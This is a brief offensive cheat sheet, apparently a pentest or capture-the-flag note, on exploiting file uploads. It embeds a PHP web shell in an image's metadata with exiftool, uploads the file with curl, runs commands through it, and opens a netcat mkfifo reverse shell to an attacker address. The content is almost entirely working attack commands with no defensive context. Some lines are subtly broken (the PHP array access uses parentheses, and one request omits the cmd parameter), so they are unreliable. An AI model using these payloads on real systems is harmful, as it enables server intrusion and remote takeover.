# File update

## Add shell to img

```zsh
exiftool -Comment='<?php echo system($_REQUEST("cmd")); ?>' image.jpg
mv image.jpg image.jpg.phpg
```

## Upload file to server

```sh
curl "http://IP_ADDRESS/Upload/image.jpg.phpg" -F "image.jpg.phpg"
```

## Execute a command

```sh
curl "http://IP_ADDRESS/Upload/image.jpg.phpg" -G --data-urlencode 'id'
```
## Execute a shell

```sh
curl "http://IP_ADDRESS/Upload/image.jpg.phpg" -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc.openbsd IP_ADDRESS PORT >/tmp/f'
```
